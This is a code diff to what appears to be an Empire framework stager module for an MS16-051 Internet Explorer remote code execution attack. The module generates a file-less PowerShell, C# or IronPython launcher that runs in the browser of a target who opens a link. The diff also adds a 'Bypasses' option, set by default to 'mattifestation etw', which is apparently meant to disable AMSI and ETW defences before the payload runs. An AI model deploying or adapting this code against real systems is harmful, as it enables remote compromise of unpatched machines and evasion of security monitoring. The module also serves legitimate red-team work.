@@ -1,14 +1,21 @@
 from __future__ import print_function
 
-from empire.server.common import helpers
+import logging
+
+log = logging.getLogger(__name__)
 
 
 class Stager(object):
     def __init__(self, mainMenu, params=[]):
-
         self.info = {
             "Name": "MS16-051 IE RCE",
-            "Author": ["CrossGroupSecurity"],
+            "Authors": [
+                {
+                    "Name": "CrossGroupSecurity",
+                    "Handle": "",
+                    "Link": "",
+                }
+            ],
             "Description": "Leverages MS16-051 to execute powershell in unpatched browsers. This is a file-less vector which "
             "works on IE9/10/11 and all versions of Windows. Target will have to open link with vulnerable version "
             "of IE.",
@@ -17,7 +24,6 @@ class Stager(object):
             ],
         }
 
-        # any options needed by the stager, settable during runtime
         self.options = {
             "Listener": {
                 "Description": "Listener to generate stager for.",
@@ -28,7 +34,7 @@ class Stager(object):
                 "Description": "Language of the stager to generate.",
                 "Required": True,
                 "Value": "powershell",
-                "SuggestedValues": ["powershell"],
+                "SuggestedValues": ["powershell", "ironpython", "csharp"],
                 "Strict": True,
             },
             "StagerRetries": {
@@ -77,20 +83,21 @@ class Stager(object):
                 "Required": False,
                 "Value": "default",
             },
+            "Bypasses": {
+                "Description": "Bypasses as a space separated list to be prepended to the launcher",
+                "Required": False,
+                "Value": "mattifestation etw",
+            },
         }
 
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
 
         for param in params:
-            # parameter format is [Name, Value]
             option, value = param
             if option in self.options:
                 self.options[option]["Value"] = value
 
     def generate(self):
-
         # extract all of our options
         language = self.options["Language"]["Value"]
         listener_name = self.options["Listener"]["Value"]
@@ -110,21 +117,40 @@ class Stager(object):
         if obfuscate.lower() == "true":
             obfuscate_script = True
 
-        # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(
-            listener_name,
-            language=language,
-            encode=encode,
-            obfuscate=obfuscate_script,
-            obfuscationCommand=obfuscate_command,
-            userAgent=user_agent,
-            proxy=proxy,
-            proxyCreds=proxy_creds,
-            stagerRetries=stager_retries,
-        )
+        if language in ["csharp", "ironpython"]:
+            if (
+                self.mainMenu.listenersv2.get_active_listener_by_name(
+                    listener_name
+                ).info["Name"]
+                != "HTTP[S]"
+            ):
+                log.error(
+                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
+                )
+                return ""
+
+            launcher = self.mainMenu.stagers.generate_exe_oneliner(
+                language=language,
+                obfuscate=obfuscate_script,
+                obfuscation_command=obfuscate_command,
+                encode=encode,
+                listener_name=listener_name,
+            )
+        elif language == "powershell":
+            launcher = self.mainMenu.stagers.generate_launcher(
+                listener_name,
+                language=language,
+                encode=encode,
+                obfuscate=obfuscate_script,
+                obfuscation_command=obfuscate_command,
+                userAgent=user_agent,
+                proxy=proxy,
+                proxyCreds=proxy_creds,
+                stagerRetries=stager_retries,
+            )
 
         if launcher == "":
-            print(helpers.color("[!] Error in launcher command generation."))
+            log.error("[!] Error in launcher command generation.")
             return ""
 
         else:
